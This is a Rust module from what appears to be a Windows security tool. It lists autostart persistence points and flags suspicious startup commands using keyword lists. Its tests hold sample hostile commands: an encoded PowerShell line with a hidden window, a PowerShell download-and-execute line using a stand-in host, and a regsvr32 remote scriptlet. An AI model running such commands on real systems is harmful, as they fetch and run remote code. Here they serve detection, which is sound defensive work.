//! Persistenz-Check (P6.3): Wo sich Programme für den nächsten Start festsetzen – Run-Schlüssel,
//! Autostart-Ordner, geplante Aufgaben, Dienste, Winlogon, IFEO, AppInit, WMI-Abos, eigene
//! COM-Einträge, Browser-Erweiterungen und Kernel-Treiber (P6.4, Abgleich in [`crate::drivers`]).
//!
//! Hier stehen nur die Daten und die **rein textbasierte** Bewertung (testbar überall). Gelesen
//! wird unter Windows in [`crate::collect`] bzw. im Dienst (Nutzerordner mit Nutzerrechten).
//! Verändert wird hier nichts.

use aegis_core::risk::RiskLevel;
use serde::{Deserialize, Serialize};

/// Art eines Autostart-Eintrags.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AutorunKind {
    /// `…\CurrentVersion\Run`.
    Run,
    /// `…\CurrentVersion\RunOnce`.
    RunOnce,
    /// `…\Policies\Explorer\Run`.
    PolicyRun,
    /// Autostart-Ordner.
    StartupFolder,
    /// Geplante Aufgabe.
    ScheduledTask,
    /// Dienst mit automatischem Start.
    Service,
    /// Winlogon (`Shell`, `Userinit`).
    Winlogon,
    /// „Image File Execution Options“ (`Debugger`).
    Ifeo,
    /// `AppInit_DLLs`.
    AppInit,
    /// WMI-Ereignis-Abo (Befehlszeile oder Skript).
    WmiConsumer,
    /// Eigener COM-Eintrag des Kontos (`HKCU\Software\Classes\CLSID`).
    ComObject,
    /// Browser-Erweiterung (Chrome/Edge).
    BrowserExtension,
    /// Kernel- bzw. Dateisystem-Treiber (Dienst-Eintrag oder nur geladen).
    Driver,
}

/// Ein gefundener Autostart-Eintrag (so, wie er gelesen wurde).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Autorun {
    /// Stabile Kennung (aus Art, Ort, Name und Befehl).
    pub id: String,
    /// Art.
    pub kind: AutorunKind,
    /// Für alle Konten (`HKLM`, gemeinsamer Ordner, Aufgaben, Dienste)?
    pub machine: bool,
    /// Ort (Schlüssel, Ordner, Aufgabenpfad …).
    pub location: String,
    /// Name (Wertname, Datei, Aufgabe, Dienst …).
    pub name: String,
    /// Befehl bzw. Ziel.
    pub command: String,
    /// Aktiv? (In Windows deaktivierte Einträge bleiben sichtbar.)
    pub enabled: bool,
    /// Starttyp eines Dienstes bzw. Treibers (0 Boot, 1 System, 2 automatisch, 3 manuell,
    /// 4 deaktiviert) – nicht Teil der Kennung.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub start: Option<u32>,
}

/// FNV-1a (64 Bit) – nur für stabile Kennungen, nicht für Sicherheit.
fn fnv(parts: &[&str]) -> u64 {
    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
    for part in parts {
        for byte in part.bytes().chain(std::iter::once(0)) {
            hash ^= u64::from(byte);
            hash = hash.wrapping_mul(0x0100_0000_01b3);
        }
    }
    hash
}

impl Autorun {
    /// Neuer Eintrag mit berechneter Kennung (Befehl auf 2048 Zeichen gekürzt).
    #[must_use]
    pub fn new(
        kind: AutorunKind,
        machine: bool,
        location: impl Into<String>,
        name: impl Into<String>,
        command: impl Into<String>,
        enabled: bool,
    ) -> Self {
        let location = location.into();
        let name = name.into();
        let command: String = command.into().chars().take(2048).collect();
        let kind_name = serde_json::to_string(&kind).unwrap_or_default();
        let id = format!("{:016x}", fnv(&[&kind_name, &location, &name, &command]));
        Self {
            id,
            kind,
            machine,
            location,
            name,
            command,
            enabled,
            start: None,
        }
    }

    /// Mit Starttyp.
    #[must_use]
    pub fn with_start(mut self, start: Option<u32>) -> Self {
        self.start = start;
        self
    }
}

/// Auffälligkeit im Befehl.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Flag {
    /// PowerShell mit kodiertem Befehl (`-enc`).
    EncodedPowerShell,
    /// Lädt Code aus dem Netz (DownloadString, Invoke-WebRequest, certutil -urlcache, bitsadmin).
    DownloadCradle,
    /// Verstecktes Fenster (`-w hidden`, `-windowstyle hidden`).
    HiddenWindow,
    /// Skript-Host (mshta, wscript, cscript).
    ScriptHost,
    /// rundll32 mit Skript (`javascript:`) bzw. regsvr32 mit Netz-Adresse („Squiblydoo“).
    LolbinScript,
    /// Datei in einem Ordner, in den jeder schreiben kann bzw. der nur für Zwischendateien ist
    /// (Temp, Downloads, `C:\Users\Public`).
    WritableLocation,
    /// Auffällig viele Verschleierungszeichen (`^`, `` ` ``).
    Obfuscated,
}

impl Flag {
    /// Risiko dieses Merkmals.
    #[must_use]
    pub fn risk(self) -> RiskLevel {
        match self {
            Self::EncodedPowerShell | Self::DownloadCradle | Self::LolbinScript => {
                RiskLevel::Dangerous
            }
            Self::ScriptHost | Self::WritableLocation | Self::Obfuscated => RiskLevel::Suspicious,
            Self::HiddenWindow => RiskLevel::Info,
        }
    }

    /// Erklärung (Deutsch, Englisch).
    #[must_use]
    pub fn explain(self) -> (&'static str, &'static str) {
        match self {
            Self::EncodedPowerShell => (
                "PowerShell mit verschlüsseltem (kodiertem) Befehl – so verstecken Angreifer, was ausgeführt wird.",
                "PowerShell with an encoded command – attackers use this to hide what runs.",
            ),
            Self::DownloadCradle => (
                "Lädt beim Start Code aus dem Internet nach.",
                "Downloads code from the internet at start.",
            ),
            Self::HiddenWindow => (
                "Startet mit verstecktem Fenster.",
                "Starts with a hidden window.",
            ),
            Self::ScriptHost => (
                "Startet ein Skript über einen Windows-Skript-Host (mshta, wscript, cscript).",
                "Runs a script through a Windows script host (mshta, wscript, cscript).",
            ),
            Self::LolbinScript => (
                "Missbraucht ein Windows-Programm (rundll32/regsvr32), um Skript- oder Netzcode auszuführen.",
                "Abuses a Windows program (rundll32/regsvr32) to run script or network code.",
            ),
            Self::WritableLocation => (
                "Liegt in einem Ordner für Zwischendateien oder einem für alle beschreibbaren Ordner (Temp, Downloads, Öffentlich).",
                "Located in a folder for temporary files or one writable by everyone (Temp, Downloads, Public).",
            ),
            Self::Obfuscated => (
                "Der Befehl ist auffällig verschleiert.",
                "The command is noticeably obfuscated.",
            ),
        }
    }
}

/// Auffälligkeiten eines Befehls (nur Text; ohne Dateizugriff).
#[must_use]
pub fn command_flags(command: &str) -> Vec<Flag> {
    let lower = command.to_ascii_lowercase();
    let mut out = Vec::new();
    let powershell = lower.contains("powershell") || lower.contains("pwsh");
    if powershell
        && [
            " -enc",
            " -e ",
            " -ec ",
            " -encodedcommand",
            " /enc",
            " /e ",
        ]
        .iter()
        .any(|p| lower.contains(p))
    {
        out.push(Flag::EncodedPowerShell);
    }
    if [
        "downloadstring",
        "downloadfile",
        "invoke-webrequest",
        "iwr ",
        "net.webclient",
        "start-bitstransfer",
        "certutil -urlcache",
        "certutil.exe -urlcache",
        "bitsadmin",
    ]
    .iter()
    .any(|p| lower.contains(p))
        || (powershell
            && lower.contains("http")
            && (lower.contains("iex") || lower.contains("invoke-expression")))
    {
        out.push(Flag::DownloadCradle);
    }
    if [
        "-w hidden",
        "-windowstyle hidden",
        "-win hidden",
        "/w hidden",
    ]
    .iter()
    .any(|p| lower.contains(p))
    {
        out.push(Flag::HiddenWindow);
    }
    if ["mshta", "wscript", "cscript"]
        .iter()
        .any(|p| lower.contains(p))
    {
        out.push(Flag::ScriptHost);
    }
    if (lower.contains("rundll32")
        && (lower.contains("javascript:") || lower.contains("vbscript:")))
        || (lower.contains("regsvr32") && (lower.contains("/i:http") || lower.contains("scrobj")))
    {
        out.push(Flag::LolbinScript);
    }
    if [
        "\\temp\\",
        "\\tmp\\",
        "\\downloads\\",
        "\\users\\public\\",
        "%temp%",
        "%tmp%",
        "\\windows\\tasks\\",
        "\\recycle",
    ]
    .iter()
    .any(|p| lower.contains(p))
    {
        out.push(Flag::WritableLocation);
    }
    let marks = command.chars().filter(|c| matches!(c, '^' | '`')).count();
    if marks >= 6 {
        out.push(Flag::Obfuscated);
    }
    out
}

/// Ist ein Winlogon-Wert verändert? (`Shell` muss `explorer.exe` sein, `Userinit` die
/// `userinit.exe` aus System32.)
#[must_use]
pub fn winlogon_modified(name: &str, value: &str) -> bool {
    let v = value
        .trim()
        .trim_end_matches(',')
        .trim()
        .to_ascii_lowercase();
    match name.to_ascii_lowercase().as_str() {
        "shell" => !(v == "explorer.exe" || v.ends_with("\\windows\\explorer.exe")),
        "userinit" => !(v.ends_with("\\system32\\userinit.exe") || v == "userinit.exe"),
        _ => false,
    }
}

/// Wert aus `StartupApproved` (Explorer): Das erste Byte ungerade = deaktiviert.
#[must_use]
pub fn startup_approved_enabled(bytes: &[u8]) -> bool {
    bytes.first().is_none_or(|b| b % 2 == 0)
}

fn xml_unescape(text: &str) -> String {
    text.replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
}

fn xml_tag<'a>(xml: &'a str, tag: &str) -> Vec<&'a str> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let mut out = Vec::new();
    let mut rest = xml;
    while let Some(start) = rest.find(&open) {
        let after = &rest[start + open.len()..];
        let Some(end) = after.find(&close) else { break };
        out.push(&after[..end]);
        rest = &after[end + close.len()..];
        if out.len() >= 32 {
            break;
        }
    }
    out
}

/// Liest aus der XML-Datei einer geplanten Aufgabe die Befehle (`Exec`) und ob sie aktiv ist.
/// Aufgaben ohne `Exec` (z. B. nur COM-Handler) liefern `None`.
#[must_use]
pub fn parse_task_xml(xml: &str) -> Option<(Vec<String>, bool)> {
    let commands: Vec<String> = xml_tag(xml, "Exec")
        .into_iter()
        .filter_map(|exec| {
            let command = xml_tag(exec, "Command")
                .first()
                .map(|c| xml_unescape(c.trim()))?;
            let args = xml_tag(exec, "Arguments")
                .first()
                .map(|a| xml_unescape(a.trim()))
                .unwrap_or_default();
            Some(if args.is_empty() {
                command
            } else {
                format!("{command} {args}")
            })
        })
        .collect();
    if commands.is_empty() {
        return None;
    }
    let settings = xml_tag(xml, "Settings").first().copied().unwrap_or("");
    let enabled = !xml_tag(settings, "Enabled")
        .first()
        .is_some_and(|e| e.trim().eq_ignore_ascii_case("false"));
    Some((commands, enabled))
}

/// Datei einer geplanten Aufgabe (`\\Ordner\\Name`) unter `root` (`System32\\Tasks`).
/// Abgelehnt: kein führendes `\\`, leere Teile, `..`, `/`, `:`, Steuerzeichen, über 260 Zeichen.
#[must_use]
pub fn task_file(root: &std::path::Path, task: &str) -> Option<std::path::PathBuf> {
    let rest = task.strip_prefix('\\')?;
    let ok = task.chars().count() <= 260
        && !rest.is_empty()
        && rest
            .split('\\')
            .all(|part| !part.is_empty() && part != "." && part != "..")
        && !task
            .chars()
            .any(|c| c.is_control() || matches!(c, '/' | ':' | '"'));
    ok.then(|| {
        rest.split('\\')
            .fold(root.to_path_buf(), |path, part| path.join(part))
    })
}

/// Bewertung eines Eintrags allein aus Art und Text (der Dienst ergänzt Datei-Prüfungen).
#[must_use]
pub fn assess(entry: &Autorun) -> (RiskLevel, Vec<Flag>) {
    let flags = command_flags(&entry.command);
    let mut risk = flags
        .iter()
        .map(|f| f.risk())
        .max()
        .unwrap_or(RiskLevel::Clean);
    let base = match entry.kind {
        AutorunKind::Winlogon if winlogon_modified(&entry.name, &entry.command) => {
            RiskLevel::Dangerous
        }
        AutorunKind::Ifeo | AutorunKind::AppInit | AutorunKind::WmiConsumer => {
            RiskLevel::Suspicious
        }
        _ => RiskLevel::Clean,
    };
    risk = risk.max(base);
    (risk, flags)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn kennung_ist_stabil_und_unterscheidet() {
        let a = Autorun::new(
            AutorunKind::Run,
            false,
            "HKU\\S\\Run",
            "x",
            "c:\\x.exe",
            true,
        );
        let b = Autorun::new(
            AutorunKind::Run,
            false,
            "HKU\\S\\Run",
            "x",
            "c:\\x.exe",
            true,
        );
        let c = Autorun::new(
            AutorunKind::Run,
            false,
            "HKU\\S\\Run",
            "x",
            "c:\\y.exe",
            true,
        );
        assert_eq!(a.id, b.id);
        assert_ne!(a.id, c.id);
        assert_eq!(a.id.len(), 16);
    }

    #[test]
    fn befehle_bewerten() {
        let flags = command_flags(
            "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==",
        );
        assert!(flags.contains(&Flag::EncodedPowerShell));
        assert!(flags.contains(&Flag::HiddenWindow));
        assert!(
            command_flags(
                "powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://x')\""
            )
            .contains(&Flag::DownloadCradle)
        );
        assert!(
            command_flags("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")
                .contains(&Flag::LolbinScript)
        );
        assert!(
            command_flags(r"C:\Users\a\AppData\Local\Temp\upd.exe /quiet")
                .contains(&Flag::WritableLocation)
        );
        assert!(command_flags(r#""C:\Program Files\App\app.exe" --tray"#).is_empty());
        assert!(command_flags("c^m^d /c ^e^c^h^o").contains(&Flag::Obfuscated));
    }

    #[test]
    fn winlogon_und_startup_approved() {
        assert!(!winlogon_modified("Shell", "explorer.exe"));
        assert!(winlogon_modified("Shell", "explorer.exe, C:\\x\\evil.exe"));
        assert!(!winlogon_modified(
            "Userinit",
            "C:\\Windows\\system32\\userinit.exe,"
        ));
        assert!(winlogon_modified(
            "Userinit",
            "C:\\Windows\\system32\\userinit.exe, C:\\x.exe"
        ));
        assert!(startup_approved_enabled(&[2, 0, 0]));
        assert!(!startup_approved_enabled(&[3, 0, 0]));
        assert!(startup_approved_enabled(&[]));
        let e = Autorun::new(
            AutorunKind::Winlogon,
            true,
            "HKLM",
            "Shell",
            "evil.exe",
            true,
        );
        assert_eq!(assess(&e).0, RiskLevel::Dangerous);
    }

    #[test]
    fn aufgaben_xml() {
        let xml = r#"<?xml version="1.0"?><Task><Settings><Enabled>false</Enabled></Settings>
<Actions><Exec><Command>C:\x\a.exe</Command><Arguments>-q &quot;b&quot;</Arguments></Exec>
<Exec><Command>cmd.exe</Command></Exec></Actions></Task>"#;
        let (commands, enabled) = parse_task_xml(xml).unwrap();
        assert_eq!(
            commands,
            vec![r#"C:\x\a.exe -q "b""#.to_owned(), "cmd.exe".to_owned()]
        );
        assert!(!enabled);
        assert!(parse_task_xml("<Task><Actions><ComHandler/></Actions></Task>").is_none());
    }

    #[test]
    fn aufgabendatei_nur_unter_dem_ordner() {
        let root = std::path::Path::new("tasks");
        assert_eq!(
            task_file(root, r"\Microsoft\Upd"),
            Some(root.join("Microsoft").join("Upd"))
        );
        for bad in [
            r"Upd", r"\", r"\a\..\b", r"\a\\b", r"\a/b", r"\C:x", "\\a\u{0}",
        ] {
            assert_eq!(task_file(root, bad), None, "{bad}");
        }
    }
}
